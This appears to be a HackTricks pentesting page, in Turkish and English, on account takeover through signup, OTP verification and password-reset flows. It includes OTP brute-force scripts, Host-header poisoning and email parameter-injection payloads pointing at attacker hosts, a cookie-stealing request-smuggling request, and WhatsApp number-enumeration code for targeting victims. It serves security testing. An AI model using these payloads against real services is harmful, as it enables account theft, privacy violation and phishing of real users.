# Kayıt ve Hesap Devralma Zafiyetleri

{{#include ../banners/hacktricks-training.md}}

## Kayıt Yoluyla Hesap Devralma

### Çift Kayıt

- Mevcut bir username kullanarak oluşturmayı dene
- Email'i değiştirerek kontrol et:
- uppercase
- +1@
- Email'e nokta ekle
- Email adında özel karakterler (%00, %09, %20)
- Email'den sonra boş karakterler koy: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Email sağlayıcı canonicalization hilelerini dene (servise bağlı):
- Gmail noktaları ve subaddressing'i görmezden gelir: `victim+1@gmail.com`, `v.ic.tim@gmail.com` `victim@gmail.com`'a teslim edilir
- Bazı sağlayıcılar local-part'ta büyük/küçük harf duyarsızdır
- Bazı sağlayıcılar unicode confusables kabul eder. local-part içinde homoglyphs ve soft hyphen `\u00AD` dene
- Bunları şu amaçlarla kötüye kullan:
  - uniqueness kontrollerini atlatmak,
  - duplicate accounts/workspace invites elde etmek,
  - veya hedefin kayıt olmasını engellemek (geçici DoS) — takeover hazırlığı sırasında

### Username Tespiti

Bir username'in uygulama içinde zaten kayıtlı olup olmadığını anlayıp anlayamayacağını kontrol et.

- Farklı hata mesajları veya HTTP status kodları
- Zamanlama farkları (kayıtlı kullanıcı IdP/DB sorgusu tetikleyebilir)
- Kayıt formunun bilinen email'ler için profil verilerini otomatik doldurması
- Team/invite akışlarını kontrol et: bir email girilmesi hesabın var olup olmadığını açığa çıkarabilir

### Parola Politikası

Yeni kullanıcı oluştururken parola politikasını kontrol et (zayıf parolalar kullanılıp kullanılamayacağını dene).\
Eğer mümkünse kimlik bilgilerine bruteforce saldırısı deneyebilirsin.

### SQL Injection

[**Bu sayfayı kontrol et** ](sql-injection/index.html#insert-statement)kayıt formlarında **SQL Injections** ile hesap devralma veya bilgi çekme yöntemlerini öğrenmek için.

### Oauth Devralmaları


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Zafiyetleri


{{#ref}}
saml-attacks/
{{#endref}}

### Email Değişikliği

Kayıt olduktan sonra email'i değiştirmeyi dene; bu değişiklik doğru şekilde doğrulanıyor mu veya rastgele email'lere izin veriliyor mu kontrol et.

### Diğer Kontroller

- Check if you can use **disposable emails** (mailinator, yopmail, 1secmail, etc.) or bypass the blocklist with subaddressing like `victim+mailinator@gmail.com`
- **Uzun** **password** (>200) **DoS**'a yol açar
- **Hesap oluşturma için rate limits**'leri kontrol et
- username@**burp_collab**.net kullan ve **callback**'i analiz et
- Telefon doğrulaması kullanılıyorsa, telefon parsing/injection köşe durumlarını kontrol et

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Telefon numarası–merkezli mesajlaşma uygulamaları, istemci rehberi eşitlendiğinde bir **presence oracle** açığa çıkarır. WhatsApp’ın discovery isteklerini yeniden oynatmak tarihsel olarak **>100M lookups per hour** sağladı, neredeyse tam hesap enumerasyonlarını mümkün kıldı.

**Saldırı iş akışı**

1. **Resmi bir client'i enstrümente et** adres-defteri yükleme isteğini yakalamak için (kimlikli blob olarak normalize edilmiş E.164 numaraları). Aynı cookies/device token'i yeniden kullanarak saldırgan tarafından oluşturulmuş numaralarla yeniden oynat.
2. **İstek başına sayıları grupla**: WhatsApp binlerce identifier kabul eder ve kayıtlı/kayıtsız ile metadata (business, companion, vb.) döner. Yanıtları offline analiz ederek hedef listeleri oluştur, kurbanlara mesaj atmadan.
3. **Yatay ölçekle** enumerasyonu SIM bankaları, cloud cihazlar veya residential proxies ile, böylece hesap/IP/ASN başına throttling hiç tetiklenmesin.

**Arama planı modelleme**

Her ülkenin arama planını modelleyerek geçersiz adayları atla. NDSS dataset'i (`country-table.*`) ülke kodlarını, benimseme yoğunluğunu ve platform dağılımını listeler, böylece yüksek isabetli aralıkları önceliklendirebilirsin. Örnek seeding kodu:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Verimliliği korumak için oracle'ı sorgulamadan önce gerçek tahsisatlarla (Mobil Ülke Kodu + Ulusal Hedef Kodu) eşleşen önekleri önceliklendirin.

**Turning enumerations into targeted attacks**

- Leaked telefon numaralarını (ör. Facebook’s 2021 breach) oracle'a vererek hangi kimliklerin hâlâ aktif olduğunu öğrenin; bunu phishing, SIM-swapping veya spamming'den önce yapın.
- Nüfus/sayım verilerini ülke/OS/uygulama türüne göre dilimleyerek yerel social engineering için zayıf SMS filtrelemesi veya yoğun WhatsApp Business benimsemesi olan bölgeleri bulun.

**Public-key reuse correlation**

WhatsApp oturum kurulumu sırasında her hesabın X25519 identity key'ini ifşa eder. Listelediğiniz her numara için kimlik materyalini isteyin ve açık anahtarları deduplikasyon yaparak hesap çiftliklerini, klonlanmış istemcileri veya güvensiz firmware'i ortaya çıkarın — paylaşılan anahtarlar multi-SIM operasyonlarını deanonymize eder.

## Weak Email/Phone Verification (OTP/Magic Link)

Kayıt akışları genellikle sahipliği sayısal bir OTP veya magic-link token ile doğrular. Tipik zafiyetler:

- Tahmin edilebilir veya kısa OTP (4–6 haneli) ve etkili rate limiting veya IP/device takibi yok. Paralel tahminler ve header/IP rotasyonu deneyin.
- OTP'nin farklı eylemler veya hesaplar arasında yeniden kullanımı, ya da belirli kullanıcı/eyleme bağlanmaması (ör. aynı kod hem login hem signup için çalışıyor ya da e-posta değişiklikten sonra da çalışıyor).
- Multi-value smuggling: bazı backend'ler birden fazla kodu kabul eder ve herhangi biri eşleşiyorsa doğrular. Deneyin:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: durum/mesaj/gövde uzunluğuna göre yanlış vs süresi dolmuş vs yanlış-kullanıcı kodlarını ayırt edin.
- Token'ler başarı sonrası veya şifre/e-posta değişikliğinden sonra geçersiz kılınmıyor.
- Verification token'in user agent/IP'ye bağlanmaması, saldırgan kontrolündeki sayfalardan cross-origin tamamlamaya izin verir.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Ardışık kilitlenmeleri aşmak için paralel/eşzamanlı tahminler (Burp'ta Turbo Intruder kullanın):

<details>
<summary>Turbo Intruder snippet ile 6 haneli OTP denemelerini floodlamak</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: aynı geçerli OTP'yi aynı anda iki oturumda gönderin; bazen bir oturum doğrulanmış saldırgan hesabı olurken mağdur akışı da başarılı olur.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Güçlü bir sorun sınıfı, saldırganın mağdurun e‑postası üzerinde mağdur hesap oluşturmadan önce işlemler yapması ve sonradan erişimi yeniden kazanması durumunda ortaya çıkar.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Web/mobil paketlerinden akışları ve uç noktaları tespit edin. classic signup, SSO linking, email/phone change ve password reset uç noktalarına bakın.
- Diğer akışları test ederken oturumları canlı tutmak için gerçekçi otomasyonlar oluşturun.
- SSO testleri için bir test OIDC sağlayıcısı kurun ve RP'nin doğrulanmamış IdP'lere güvenip güvenmediğini kontrol etmek için mağdur adresi için `email` claim'leri ve `email_verified=false` içeren token'lar verin.
- Herhangi bir password reset veya email change işleminden sonra doğrulayın ki:
  - tüm diğer oturumlar ve token'lar invalidated edilmiş olsun,
  - bekleyen email/phone change yetenekleri iptal edilmiş olsun,
  - daha önce bağlı olan IdP'ler/e‑postalar/telefonlar yeniden doğrulanmış olsun.

Not: Bu tekniklerin kapsamlı metodolojisi ve vaka çalışmaları Microsoft’un pre‑hijacking araştırmasında belgelenmiştir (bkz. sondaki Referanslar).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. E‑posta adresinize password reset isteği gönderin
2. Password reset linkine tıklayın
3. Şifreyi değiştirmeyin
4. Herhangi bir 3rd party siteye tıklayın (örn: Facebook, twitter)
5. İsteği Burp Suite proxy'de intercept edin
6. Referer header'ın password reset token'ı leaking edip etmediğini kontrol edin.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Password reset isteğini Burp Suite'de intercept edin
2. Burp Suite'de aşağıdaki header'ları ekleyin veya düzenleyin: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Değiştirilmiş header ile isteği iletin\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ bazlı bir password reset URL'si arayın, örn: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Saldırgan, kendi hesabıyla giriş yapmalı ve **Şifreyi değiştir** özelliğine gitmeli.
2. Burp Suite'i başlatın ve isteği intercept edin
3. Repeater sekmesine gönderin ve parametreleri düzenleyin: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Parola sıfırlama tokeni rastgele oluşturulmalı ve her seferinde benzersiz olmalıdır.\
Tokenin süresi dolup dolmadığını veya her zaman aynı olup olmadığını belirlemeye çalışın; bazı durumlarda üretim algoritması zayıf olabilir ve tahmin edilebilir. Algoritmada aşağıdaki değişkenler kullanılabilir.

- Zaman damgası
- UserID
- Kullanıcının e-posta adresi
- Ad ve Soyad
- Doğum Tarihi
- Kriptografi
- Sadece sayılar
- Kısa token dizisi (karakterler arasında \[A-Z,a-z,0-9])
- Token yeniden kullanımı
- Token sona erme tarihi

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Belirli bir e-posta için API/UI üzerinden parola sıfırlama isteği tetikleyin, örn: test@mail.com
2. Sunucu yanıtını inceleyin ve `resetToken`'ı kontrol edin
3. Daha sonra tokeni şu şekilde bir URL'de kullanın: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Sisteme, kurbanın kullanıcı adıyla aynı olan ancak kullanıcı adının önüne ve/veya sonuna boşluklar eklenmiş bir kullanıcı adıyla kayıt olun. e.g: `"admin "`
2. Kötücül kullanıcı adınızla parola sıfırlama isteği yapın.
3. E-postanıza gönderilen tokeni kullanarak kurbanın parolasını sıfırlayın.
4. Yeni parola ile kurban hesabına giriş yapın.

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Uygulama içinde veya çerezler ana domain'e scope edilmişse bir subdomain üzerinde bir XSS bulun : `*.domain.com`
2. Leak the current **sessions cookie**
3. Cookie kullanarak kullanıcı olarak kimlik doğrulayın

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. HTTP Request Smuggling türünü tespit etmek için **smuggler**'ı kullanın (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. `POST / HTTP/1.1` üzerine aşağıdaki verilerle yazacak bir istek oluşturun:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` amaç, kurbanları burpcollab'a open redirect ile yönlendirip cookie'lerini çalmaktır\
3. Final request could look like the following
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone bu açığın istismar edildiğini rapor etti\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF ile Hesap Ele Geçirme <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF için bir payload oluşturun, örn: “parola değişikliği için otomatik gönderimli HTML formu”
2. Payload'ı gönderin

### JWT ile Hesap Ele Geçirme <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token bir kullanıcıyı doğrulamak için kullanılabilir.

- JWT'yi başka bir User ID / Email ile düzenleyin
- JWT imzasının zayıf olup olmadığını kontrol edin


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Bazı signup handler'ları sağlanan e-posta zaten mevcut olduğunda bir upsert gerçekleştirir. Eğer endpoint e-posta ve parola içeren minimal bir body kabul ediyor ve sahiplik doğrulamasını uygulamıyorsa, mağdurun e-postasını göndermek parolalarını doğrulama öncesinde üzerine yazar.

- Discovery: paketlenmiş JS'ten (veya mobil uygulama trafiğinden) endpoint isimlerini toplayın, sonra ffuf/dirsearch kullanarak /parents/application/v4/admin/FUZZ gibi base path'leri fuzz'layın.
- Method hints: "Only POST request is allowed." gibi mesaj döndüren bir GET genellikle doğru verb'ü ve bir JSON body beklendiğini gösterir.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Örnek PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Etkisi: Reset token, OTP veya e-posta doğrulaması gerekmeden Tam Hesap Ele Geçirme (ATO).

## Referanslar

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
